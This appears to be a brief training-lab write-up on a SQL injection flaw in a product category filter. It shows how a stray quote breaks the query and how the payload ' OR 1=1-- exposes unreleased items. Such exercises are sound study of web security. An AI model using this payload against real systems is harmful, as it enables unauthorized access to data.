# Lab 01 : SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

## Overview:
- Level : APPRENTICE
- SQL injection - product category filter
- SELECT * FROM products WHERE category = 'Gifts' AND released = 1 
- End goal: display all products both released and unreleased.

## Analysis:
- when we select gifts as category it give 3 items
- put ' and it give 500 internal server error   
    SELECT * FROM products WHERE category = '

## Solution:
- we want to display all products both released and unreleased.
    payload : ' OR 1=1--
    query : SELECT * FROM products WHERE category = '' OR 1=1--'


